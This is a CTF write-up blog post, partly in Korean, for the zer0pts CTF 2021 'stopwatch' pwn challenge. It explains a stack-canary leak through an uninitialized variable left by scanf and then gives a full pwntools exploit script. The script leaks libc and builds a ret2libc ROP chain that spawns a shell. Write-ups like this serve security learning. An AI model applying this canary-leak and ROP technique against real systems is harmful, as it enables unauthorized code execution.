---
layout: post
title: zer0pts CTF 2021 stopwatch write-up
categories: ctf-write-up
tags: [ctf]
---


## stopwatch (196pts, 22solves)

### Summary

1. `scanf("%s")`
2. Using + or - when calling scanf results in an `uninitialized variable`. (canary leak)



되게 신박했던 문제였다.  `scanf("%s")`를 사용하기 때문에 bof가 발생하는데 문제는 canary를 모른다는 것이었다.



근데 하나 특이한게 사용자에게 scanf로 소수를 입력받고 이를 출력해주는 루틴이 있었다. scanf로 숫자를 입력받을 때 +나 -를 넣으면 입력을 받지 않기 때문에 uninitialized 취약점이 발생한다.



그리고 이 출력되는 소수는 alloca가 어떻게 되는지에 따라 달라졋었는데 대충 27을 넣어주니 카나리가 릭되는 걸 확인했다.



그 이후엔 그냥 rop 하면 된다.

```python
from pwn import *
from struct import *

#p = process('./chall', env={'LD_PRELOAD':'./libc.so.6'})
p = remote("pwn.ctf.zer0pts.com", 9002)
e = ELF('./chall')
#libc = e.libc
libc = ELF('./libc.so.6')

def dtoi(f):
    return (unpack('<Q', pack('<d', f))[0])


p.sendlineafter('> ', 'A' * 0x80)
p.sendlineafter('> ', str(27))
p.sendlineafter(': ', '+')

canary = (dtoi(float(p.recvline().split(' ')[6])))
print hex(canary)

pop_rdi = 0x400e93

payload = ''
payload += 'A' * (0x20-8)
payload += p64(canary)
payload += 'A' * 8
payload += p64(pop_rdi)
payload += p64(0x601ff0)
payload += p64(e.plt['puts'])
payload += p64(0x40089B)

p.sendline()
p.sendline()
p.recv(2048)
p.sendline(payload)

p.recvuntil("Play again? (Y/n) ")
leak = u64(p.recv(6).ljust(8, '\x00'))
libc_base = leak - libc.sym['__libc_start_main'] 
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
print hex(libc_base)

payload = ''
payload += 'A' * (0x20-8)
payload += p64(canary)
payload += 'A' * 8
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rdi - 2) * 3
payload += p64(system)

p.sendline()
p.sendline()
p.recv(2048)
p.sendline(payload)

p.interactive()
```



